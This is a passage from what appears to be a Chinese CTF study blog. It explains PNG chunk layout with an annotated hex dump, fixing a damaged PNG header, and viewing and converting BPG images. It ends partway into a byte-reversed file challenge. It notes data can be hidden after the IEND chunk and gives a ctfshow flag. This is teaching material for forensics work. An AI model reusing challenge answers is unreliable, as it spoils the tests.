77);">如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：</font></p><p><font style="color:rgb(77, 77, 77);">00 00 00 00 49 45 4E 44 AE 42 60 82</font></p><p><font style="color:rgb(77, 77, 77);">不难明白，由于数据块结构的定义，IEND数据块的长度总是0（00 00 00 00，除非人为加入信息），数据标识总是IEND（49 45 4E 44），因此，CRC码也总是AE 42 60 82。</font></p><p><font style="color:rgb(77, 77, 77);">最后，除了表示数据块开始的IHDR必须放在最前面， 表示PNG文件结束的IEND数据块放在最后面之外，其他数据块的存放顺序没有限制。</font></p><h4 id="辅助数据块"><a href="#辅助数据块" class="headerlink" title="辅助数据块"></a><font style="color:rgb(79, 79, 79);">辅助数据块</font></h4><p><font style="color:rgb(77, 77, 77);">（比较杂，不需要全部了解透）</font></p><p><font style="color:rgb(77, 77, 77);">PNG文件格式规范制定的10个辅助数据块是：</font></p><ol><li><font style="color:rgb(51, 51, 51);">背景颜色数据块bKGD(background color)。</font></li><li><font style="color:rgb(51, 51, 51);">基色和白色度数据块cHRM(primary chromaticities and white point)。所谓白色度是指当R＝G＝B＝最大值时在显示器上产生的白色度。</font></li><li><font style="color:rgb(51, 51, 51);">图像γ数据块gAMA(image gamma)。</font></li><li><font style="color:rgb(51, 51, 51);">图像直方图数据块hIST(image histogram)。</font></li><li><font style="color:rgb(51, 51, 51);">物理像素尺寸数据块pHYs(physical pixel dimensions)。</font></li><li><font style="color:rgb(51, 51, 51);">样本有效位数据块sBIT(significant bits)。</font></li><li><font style="color:rgb(51, 51, 51);">文本信息数据块tEXt(textual data)。</font></li><li><font style="color:rgb(51, 51, 51);">图像最后修改时间数据块tIME (image last-modification time)。</font></li><li><font style="color:rgb(51, 51, 51);">图像透明数据块tRNS (transparency)。</font></li><li><font style="color:rgb(51, 51, 51);">压缩文本数据块zTXt (compressed textual data)。</font></li></ol><h4 id="数据块摘要"><a href="#数据块摘要" class="headerlink" title="数据块摘要"></a><font style="color:rgb(79, 79, 79);">数据块摘要</font></h4><p><font style="color:rgb(77, 77, 77);">关键数据块、辅助数据块和专用公共数据块(special-purpose public chunks)综合下表中：</font></p><table><thead><tr><th align="left"><strong><font style="color:rgb(79, 79, 79);">数据块符号</font></strong></th><th align="left"><strong><font style="color:rgb(79, 79, 79);">数据块名称</font></strong></th><th align="left"><strong><font style="color:rgb(79, 79, 79);">多数据块</font></strong></th><th align="left"><strong><font style="color:rgb(79, 79, 79);">可选否</font></strong></th><th align="left"><strong><font style="color:rgb(79, 79, 79);">位置限制</font></strong></th></tr></thead><tbody><tr><td align="left"><font style="color:rgb(79, 79, 79);">IHDR</font></td><td align="left"><font style="color:rgb(79, 79, 79);">文件头数据块</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">第一块</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">cHRM</font></td><td align="left"><font style="color:rgb(79, 79, 79);">基色和白色点数据块</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">在PLTE和IDAT之前</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">gAMA</font></td><td align="left"><font style="color:rgb(79, 79, 79);">图像γ数据块</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">在PLTE和IDAT之前</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">sBIT</font></td><td align="left"><font style="color:rgb(79, 79, 79);">样本有效位数据块</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">在PLTE和IDAT之前</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">PLTE</font></td><td align="left"><font style="color:rgb(79, 79, 79);">调色板数据块</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">在IDAT之前</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">bKGD</font></td><td align="left"><font style="color:rgb(79, 79, 79);">背景颜色数据块</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">在PLTE之后IDAT之前</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">hIST</font></td><td align="left"><font style="color:rgb(79, 79, 79);">图像直方图数据块</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">在PLTE之后IDAT之前</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">tRNS</font></td><td align="left"><font style="color:rgb(79, 79, 79);">图像透明数据块</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">在PLTE之后IDAT之前</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">oFFs</font></td><td align="left"><font style="color:rgb(79, 79, 79);">(专用公共数据块)</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">在IDAT之前</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">pHYs</font></td><td align="left"><font style="color:rgb(79, 79, 79);">物理像素尺寸数据块</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">在IDAT之前</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">sCAL</font></td><td align="left"><font style="color:rgb(79, 79, 79);">(专用公共数据块)</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">在IDAT之前</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">IDAT</font></td><td align="left"><font style="color:rgb(79, 79, 79);">图像数据块</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">与其他IDAT连续</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">tIME</font></td><td align="left"><font style="color:rgb(79, 79, 79);">图像最后修改时间数据块</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">无限制</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">tEXt</font></td><td align="left"><font style="color:rgb(79, 79, 79);">文本信息数据块</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">无限制</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">zTXt</font></td><td align="left"><font style="color:rgb(79, 79, 79);">压缩文本数据块</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">无限制</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">fRAc</font></td><td align="left"><font style="color:rgb(79, 79, 79);">(专用公共数据块)</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">无限制</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">gIFg</font></td><td align="left"><font style="color:rgb(79, 79, 79);">(专用公共数据块)</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">无限制</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">gIFt</font></td><td align="left"><font style="color:rgb(79, 79, 79);">(专用公共数据块)</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">无限制</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">gIFx</font></td><td align="left"><font style="color:rgb(79, 79, 79);">(专用公共数据块)</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">是</font></td><td align="left"><font style="color:rgb(79, 79, 79);">无限制</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">IEND</font></td><td align="left"><font style="color:rgb(79, 79, 79);">图像结束数据</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">否</font></td><td align="left"><font style="color:rgb(79, 79, 79);">最后一个数据块</font></td></tr></tbody></table><p><font style="color:rgb(77, 77, 77);">tEXt和zTXt数据块中的标准关键字：</font></p><table><thead><tr><th align="left"><strong><font style="color:rgb(79, 79, 79);">关键字</font></strong></th><th align="left"><strong><font style="color:rgb(79, 79, 79);">说明</font></strong></th></tr></thead><tbody><tr><td align="left"><font style="color:rgb(79, 79, 79);">Title</font></td><td align="left"><font style="color:rgb(79, 79, 79);">图像名称或者标题</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Author</font></td><td align="left"><font style="color:rgb(79, 79, 79);">图像作者名</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Description</font></td><td align="left"><font style="color:rgb(79, 79, 79);">图像说明</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Copyright</font></td><td align="left"><font style="color:rgb(79, 79, 79);">版权声明</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">CreationTime</font></td><td align="left"><font style="color:rgb(79, 79, 79);">原图创作时间</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Software</font></td><td align="left"><font style="color:rgb(79, 79, 79);">创作图像使用的软件</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Disclaimer</font></td><td align="left"><font style="color:rgb(79, 79, 79);">弃权</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Warning</font></td><td align="left"><font style="color:rgb(79, 79, 79);">图像内容警告</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Source</font></td><td align="left"><font style="color:rgb(79, 79, 79);">创作图像使用的设备</font></td></tr><tr><td align="left"><font style="color:rgb(79, 79, 79);">Comment</font></td><td align="left"><font style="color:rgb(79, 79, 79);">各种注释</font></td></tr></tbody></table><h3 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a><font style="color:rgb(79, 79, 79);">一个例子</font></h3><p><font style="color:rgb(77, 77, 77);">为了便于研究，我在本地找了个24x24像素的图片：</font></p><p><font style="color:rgb(77, 77, 77);">用十六进制打开后是这样的：</font></p><p>| <code>plain 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 </code>  | <code>plain 0000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR 0000010: 0000 0018 0000 0018 0806 0000 00e0 773d  ..............w= 0000020: f800 0000 1974 4558 7453 6f66 7477 6172  .....tEXtSoftwar 0000030: 6500 4164 6f62 6520 496d 6167 6552 6561  e.Adobe ImageRea 0000040: 6479 71c9 653c 0000 0344 4944 4154 78da  dyq.e&lt;...DIDATx. 0000050: b454 4b48 5b51 10bd 792f 2646 a346 7411  .TKH[Q..y/&amp;F.Ft. 0000060: 450b cac3 6840 8c14 0242 8542 e9aa ab42  E...h@...B.B...B 0000070: 5785 8614 c428 b4d0 5569 b108 5dbb 29b4  W....(..Ui..].). 0000080: 1b05 a5ab 6cb3 2a14 0ab5 8b42 75a3 d188  ....l.*....Bu... 0000090: 82c6 0ff1 4320 a2e2 2f7e 12ed 9c47 e671  ....C ../~...G.q 00000a0: 8d2f 8950 3a30 dcc7 bb33 67e6 cee7 5826  ./.P:0...3g...X&amp; 00000b0: 2626 8499 288a a2ab d56a d555 55d5 57d7  &amp;&amp;..(....j.UU.W. 00000c0: d7d7 be6c 36fb fef2 f232 45a7 b8ba ba12  ...l6....2E..... 00000d0: c160 5014 13ab d94f 8bc5 72e3 24e0 1e9f  .`P....O..r.$... 00000e0: cff7 b9ae ae4e 4c4e 4eda 3299 4c00 777c  .....NLNN.2.L.w| 00000f0: 5f4c 1472 16f9 9a07 2e6a 6b6b 875a 5b5b  _L.r.....jkk.Z[[ 0000100: 454d 4d8d e8ea ea7a 4eff 3ce2 8ea2 3018  EMM....zN.&lt;...0. 0000110: 94cb c28a 7f04 765f d3b4 27ec d0d8 d8a8  ......v_..&#39;..... 0000120: 5655 55bd 639b 9201 a8b6 a8af 516b 9bcd  VUU.c.......Qk.. 0000130: 26ca caca f46f 0020 7bb7 db6d 38d8 ed76  &amp;....o. &#123;..m8..v 0000140: d1d1 d1f1 82ee 34d8 940c 0023 00c2 11e0  ......4....#.... 0000150: 1c20 975d 2781 3d75 381c 379c 9a9b 9b55  . .]&#39;.=u8.7....U 0000160: 2ad7 1012 bb73 0028 c073 1373 8f02 3c68  *....s.(.s.s..&lt;h 0000170: 6b6b fb44 25b9 e554 5e5e 2eba bbbb f18a  kk.D%..T^^...... 0000180: c791 4844 2b16 c012 0e87 fd04 faac bebe  ..HD+........... 0000190: be85 cad1 e272 b97c 04a0 e245 4ea7 530f  .....r.|...EN.S. 00001a0: 5c48 8e8f 8f45 3a9d d6f5 f0f0 7091 747b  \H...E:.....p.t&#123; 00001b0: 7777 779d feff a649 0b07 0281 acb5 baba  www....I........ 00001c0: fa97 dfef 7710 7041 309e 2c79 ba20 4800  ....w.pA0.,y. H. 00001d0: 9a13 2f81 7a11 7479 79b9 3f16 8ba1 ae63  ../.z.tyy.?....c 00001e0: caf9 f979 120b 83c5 81e6 03e3 8e4f 59e5  ...y.........OY. 00001f0: a010 5e3c f405 2705 dbd6 7b90 4aa5 1ecd  ..^&lt;..&#39;...&#123;.J... 0000200: cdcd 250e 0e0e c4c5 c585 a080 fa49 0686  ..%..........I.. 0000210: 1303 ca81 7007 1bf6 c1f7 d9d9 9958 5b5b  ....p........X[[ 0000220: 1384 f73a 140a 7de3 3d58 27e9 8d46 a371  ...:..&#125;.=X&#39;..F.q 0000230: 0491 c14a 89fc 1204 01f8 d4d4 1461 87be  ...J.........a.. 0000240: e46f 7262 6363 a377 6666 6671 6f6f cfc8  .orbcc.wfffqoo.. 0000250: dc6c cb65 651b 3439 1e8f 03bc 8fc0 c70a  .l.ee.49........ 0000260: 5145 3291 483c 5c58 5888 a251 a5c0 5989  QE2.H&lt;\XX..Q..Y. 0000270: f8c4 d6d6 5676 7a7a fae5 c0c0 c0f8 ad3d  ....Vvzz.......= 0000280: c823 ac14 3df3 c3d1 d191 d1e4 620a 5f94  .#..=.......b._. 0000290: 6673 7333 3238 38f8 b520 9be6 3887 ff79  fss3288.. ..8..y 00002a0: 989b f85f 7e3f e4a4 b0f1 74af 1525 3b36  ..._~?....t..%;6 00002b0: 8423 ed45 6745 4585 012c 4f92 3c41 fc02  .#.EgEE..,O.&lt;A.. 00002c0: d008 ed90 7774 74d4 5694 4df9 248e f182  ....wtt.V.M.$... 00002d0: 3278 4ccd 9aca 8161 039f caca 4a80 9b52  2xL....a....J..R 00002e0: b855 1e49 3a55 32f6 c209 60bc 4068 3aa6  .U.I:U2...`.@h:. 00002f0: 8b1a 9aa6 041c 4429 3a6f 7150 3000 9d9d  ......D):oqP0... 0000300: 641e 33ed 8114 a485 0238 4178 703c 3939  d.3......8Axp&lt;99 0000310: 11c9 6452 acac acfc 248e 798b 9d21 b0e1  ..dR....$.y..!.. 0000320: f6f6 f6fe a6a6 2683 5ec0 5b94 948f eec3  ......&amp;.^.[..... 0000330: 055f c001 3015 5838 64bc baba 1add d9d9  ._..0.X8d....... 0000340: 01f0 0f76 a0cd 7d33 3f3f 3f42 73ff d1e3  ...v..&#125;3???Bs... 0000350: f104 1b1a 1a54 f890 6805 a748 9a92 3fb4  .....T..h..H..?. 0000360: e6df 691f dcfb fbfb 2366 19e5 64fb f4f4  ..i.....#f..d... 0000370: b46f 7676 7664 6969 6998 5ed1 43fd 1837  .ovvvdiii.^.C..7 0000380: a5eb bb50 c2bf 8822 feb3 fc15 6000 74fe  ...P...&quot;....`.t. 0000390: 7622 c159 82da 0000 0000 4945 4e44 ae42  v&quot;.Y......IEND.B 00003a0: 6082 0a                                  `.. </code>  |<br>| — | — |</p><p><font style="color:rgb(77, 77, 77);">接下来我们试着分析一下：</font></p><p><font style="color:rgb(77, 77, 77);">首先是八个字节的文件头标志，标识着png文件：</font></p><table><thead><tr><th><code>plain 1 </code></th><th><code>plain 8950 4e47 0d0a 1a0a </code></th></tr></thead></table><p><font style="color:rgb(77, 77, 77);">接下来的地方就是IHDR数据块了：</font></p><p><font style="color:rgb(77, 77, 77);">0000 000d</font><font style="color:rgb(77, 77, 77);">说明IHDR头块长为13</font></p><p><font style="color:rgb(77, 77, 77);">4948 4452</font><font style="color:rgb(77, 77, 77);">IHDR标识（ascii码为IHDR）</font></p><p><font style="color:rgb(77, 77, 77);">下面是IHDR数据块的实际内容</font></p><p><font style="color:rgb(77, 77, 77);">0000 0018</font><font style="color:rgb(77, 77, 77);">图像的宽，24像素</font></p><p><font style="color:rgb(77, 77, 77);">0000 0018</font><font style="color:rgb(77, 77, 77);">图像的高，24像素</font></p><p><font style="color:rgb(77, 77, 77);">08</font><font style="color:rgb(77, 77, 77);"> 表示色深，这里是2^8&#x3D;256，即这是一个256色的图像</font></p><p><font style="color:rgb(77, 77, 77);">06</font><font style="color:rgb(77, 77, 77);"> 颜色类型，查表可知这是带α通道数据的真彩色图像</font></p><p><font style="color:rgb(77, 77, 77);">00</font><font style="color:rgb(77, 77, 77);"> PNG Spec规定此处总为0（非0值为将来使用更好的压缩方法预留），表示使压缩方法(LZ77派生算法)</font></p><p><font style="color:rgb(77, 77, 77);">00</font><font style="color:rgb(77, 77, 77);"> 同上</font></p><p><font style="color:rgb(77, 77, 77);">00</font><font style="color:rgb(77, 77, 77);"> 非隔行扫描</font></p><p><font style="color:rgb(77, 77, 77);">e0 773d f8</font><font style="color:rgb(77, 77, 77);"> CRC校验</font></p><p><font style="color:rgb(77, 77, 77);">以上分析了第一个IHDR块的内容，其他块的分析方法类似，比如接下来的就是tEXt块了，很简单，不做分析了。（当然这里还有重要的IDAT块，这是图像的实际内容）</font></p><p><font style="color:rgb(77, 77, 77);">最后得有个IEND数据块，这部分正如上所说，通常都应该是</font></p><p><font style="color:rgb(77, 77, 77);">00 00 00 00 49 45 4E 44 AE 42 60 82</font></p><p><font style="color:rgb(77, 77, 77);">由于我用的是vim打开，vim在文件最后都会恶心的自己加上0a换行，当然这并没有什么坏的影响。不过这也提醒了我们一个问题，既然在IEND块后面添加任何的字符都对文件的打开造成不了影响，那我们就可以在这里藏一些数据了（当然这种藏法很low）。。。</font></p><p><font style="color:rgb(77, 77, 77);">OK，这就是png文件的基本构造了。</font></p><h2 id="例题：可能会修改文件名"><a href="#例题：可能会修改文件名" class="headerlink" title="例题：可能会修改文件名"></a><font style="color:rgb(77, 77, 77);">例题：可能会修改文件名</font></h2><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715249478476-fc4500f4-d179-4a9e-8ca3-b739743ed423-562206.png" alt="1715249478476-fc4500f4-d179-4a9e-8ca3-b739743ed423.png"></p><p>可能是头文件出问题</p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1715249511415-c2ce3779-2cd3-4e8f-bf8a-75c7641c71f1-445904.png" alt="1715249511415-c2ce3779-2cd3-4e8f-bf8a-75c7641c71f1.png"></p><p>看上面的8个字节头文件标志</p><p>89 50 4E 47 0D 0A 1A 0A</p><p>改完就可以打开图片了</p><h1 id="BPG文件格式详解"><a href="#BPG文件格式详解" class="headerlink" title="BPG文件格式详解"></a>BPG文件格式详解</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>BPG（Better Portable Graphics）是一种新的图像格式。 其目的是在质量或文件大小成问题时替换JPEG图像格式。 它的主要优点是：</p><p>1、压缩比高。 对于类似的质量，文件比JPEG小得多。</p><p>2、大多数Web浏览器都支持小型Javascript解码器（gzip压缩大小：56 KB）。</p><p>3、基于HEVC开放视频压缩标准的子集。</p><p>4、支持与JPEG（灰度，YCbCr 4：2：0,4：2：2,4：4：4）相同的色度格式，以减少转换过程中的损耗。 支持Alpha通道。 还支持RGB，YCgCo和CMYK颜色空间。</p><p>5、本机支持每通道8至14位，以获得更高的动态范围。</p><p>6、支持无损压缩。</p><p>7、可以包括各种元数据（例如EXIF，ICC配置文件，XMP）。</p><p>8、动画支持。</p><p>原文链接：<a href="https://blog.csdn.net/CT_WJ/article/details/97812299">https://blog.csdn.net/CT_WJ&#x2F;article&#x2F;details&#x2F;97812299</a></p><h2 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h2><p><font style="color:rgb(77, 77, 77);">只考虑电脑上，Honeyview 是目前我评价最高的看图软件，地址：</font><a href="https://www.bandisoft.com/honeyview/">www.bandisoft.com/honeyview</a><font style="color:rgb(77, 77, 77);">。截面乍一看有点古朴：</font></p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1721531586323-c3eaaf07-e067-4b09-a548-d29e7041d0ae-716908.png" alt="1721531586323-c3eaaf07-e067-4b09-a548-d29e7041d0ae.png"></p><p><font style="color:rgb(77, 77, 77);">安装之后设置一下，让菜单自动隐藏就没问题了，实际用的时候只会显示个窗口边框。现在还没遇到它不支持的图片格式，除了矢量图，比如svg 和cad 的格式。</font></p><h2 id="转换"><a href="#转换" class="headerlink" title="转换"></a><font style="color:rgb(77, 77, 77);">转换</font></h2><p><font style="color:rgb(77, 77, 77);">图片批量转换成bpg 可以用honeyview 的资源管理器右键菜单，也可以用一个叫romeolight bpgconv 的工具，专门用来把jpg 和png 批量转换成bpg。</font></p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1721531685378-62100093-7327-4704-9842-13ae5a729073-721413.png" alt="1721531685378-62100093-7327-4704-9842-13ae5a729073.png"></p><p>把图片文件夹拖进去，工具会筛选出所有jpg，jpeg 和png 文件，然后点一下左上角的三角按钮就开始批量转换。文件数量比较多，图片内容比较复杂的话转换时间会很长，吃CPU，可以全核跑满。一批图片处理完之后点左上角的圆圈箭头清空列表，然后可以再往里拖一批，不先清空的话它会把处理完的图片再处理一遍。</p><p>转换之前，最好先点开右上角的三条杠，打开菜单，调整一下输出文件的位置：</p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1721531712314-da14e416-8e4e-4283-862c-a9416aa3a446-572528.png" alt="1721531712314-da14e416-8e4e-4283-862c-a9416aa3a446.png"></p><p>默认是自动在桌面新建个文件夹，所有输出文件放在里面，切换成“Same Location as File”，输出文件就会放在源文件同目录下，如果一次转换多个文件夹，这样图片分类不会乱。其他设置都不用动。转换完再手动把所有jpg，png 源文件删除掉就行了，比如直接rm *.jpg。</p><p>这个软件的官网似乎已经挂了，windows 上想安装，可以用scoop 安装个绿色版：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">scoop install bpgconv<br></code></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">或者下载我复制出来的绿色包：</font><a href="https://download.csdn.net/download/Etberzin/86504852">download.csdn.net&#x2F;download&#x2F;Etberzin&#x2F;86448960</a><font style="color:rgb(77, 77, 77);">，0 积分。再或者，随便搜个下载站，风险自担。</font></p><h2 id="预览"><a href="#预览" class="headerlink" title="预览"></a><font style="color:rgb(77, 77, 77);">预览</font></h2><p>但是转换成bpg 之后，windows 资源管理器里不能显示图片预览，想找个图片就比较麻烦，honeyview 可以打开bpg，但是没有给资源管理器集成bpg 的预览功能。所以又要找个工具，Simple BPG Image Viewer ：github.com&#x2F;asimba&#x2F;pybpgviewer&#x2F;releases&#x2F;tag&#x2F;v1.28，这也是个bpg 图片查看器，不如honeyview 好用，但是提供了bpg 预览的插件。</p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1721531820822-3fca6a90-c152-4258-9fd6-edf63166c877-823297.png" alt="1721531820822-3fca6a90-c152-4258-9fd6-edf63166c877.png"></p><p><font style="color:rgb(77, 77, 77);">点击红圈里的链接下载个安装包，一路ok 安装完，可能需要把软件启动一次，然后用资源管理器打开有bpg 图片的文件夹，图片预览应该就能自动加载出来了。</font></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><font style="color:rgb(77, 77, 77);">总结</font></h2><p>日常使用可能还是webp 更方便，支持的范围更广。要是所有图片都拿bpg 存，到时候想给别人发个图还得先转换成jpg 或者webp。只是我感觉webp 压出明显差异的可能性更大，bpg 最适合用的场合是那些估计只有自己看的一大堆图片库存，比如瑟图~ 不过几千张瑟图转换一波能省的空间也不过就几个GB 而已，大概是把一共5GB 的的图片文件夹压缩到500MB 这个程度，有没有用~ 自己看呗。</p><p>原文链接：<a href="https://blog.csdn.net/Etberzin/article/details/126502703">https://blog.csdn.net/Etberzin/article/details/126502703</a></p><h2 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h2><p>看到bpg格式的图片拖入honeyview就可以看到flag了</p><p><img src="/./img/49277317_Q5542BIfgUtALiTb/1721532010959-1aaf41bd-4461-4dea-a80d-a65f1c851cfe-797084.png" alt="1721532010959-1aaf41bd-4461-4dea-a80d-a65f1c851cfe.png"></p><p>ctfshow{aade771916df7cde3009c0e631f9910d}</p><blockquote><p>更新: 2024-07-21 11:42:57<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/tth8pal7cl00g180">https://www.yuque.com/chaye-apqbl/vsc85q/tth8pal7cl00g180</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E5%80%92%E5%BA%8F/"/>
    <url>/2026/01/19/MISC/%E5%9F%BA%E7%A1%80/%E6%96%87%E4%BB%B6%E5%80%92%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="文件倒序"><a href="#文件倒序" class="headerlink" title="文件倒序"></a>文件倒序</h1><h1 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h1><p><a href="https://blog.csdn.net/MarkRao/article/details/120900188">一道经典的Misc图片倒叙题目_misc png 逆序-CSDN博客</a></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="正着看还是反着看呢？"><a href="#正着看还是反着看呢？" class="headerlink" title="正着看还是反着看呢？"></a>正着看还是反着看呢？</h2><p>看到要倒序，注意他这里是两个字节一组进行倒序的</p><p>jpg 文件头 FF D8 FF E0<br>文件尾是 FF D9 </p><p>D9FF</p><p><img src="/./img/49277317_eoViQdBN-8fnxBUZ/1723711338491-709d7522-23a5-40ce-bb3e-d629bd22466e-263319.png" alt="1723711338491-709d7522-23a5-40ce-bb3e-d629bd22466e.png"></p><p><img src="/./img/49277317_eoViQdBN-8fnxBUZ/1723712639959-32079af1-6dd4-47b0-83a3-6ec25848e1f0-211085.png" alt="1723712639959-32079af1-6dd4-47b0-83a3-6ec25848e1f0.png"></p><p><img src="/./img/49277317_eoViQdBN-8fnxBUZ/1723718995985-32ba81dd-7c62-47d2-94b2-baac03d45509-346065.png" alt="1723718995985-32ba81dd-7c62-47d2-94b2-baac03d45509.png"></p><p><font style="color:#DF2A3F;">可以发现有个flag.txt的倒序，所以我们整个都复制过去进行处理</font></p><p><font style="color:#DF2A3F;">如果只复制到文件尾的话就会丢失文件，导致隐藏文件的消失</font></p><p><img src="/./img/49277317_eoViQdBN-8fnxBUZ/1723719081989-cbd6dbe2-0c14-4a85-b2ae-c70ff95b07b6-816911.png" alt="1723719081989-cbd6dbe2-0c14-4a85-b2ae-c70ff95b07b6.png"></p><p><font style="color:rgb(77, 77, 77);">选中尾部拉到最底部，然后（编辑→复制为→复制为十六进制文本）然后在桌面创建一个文本文件，ctrl+v直接复制进去，然后编写脚本</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs plain"># 打开并读取原始文件内容<br>with 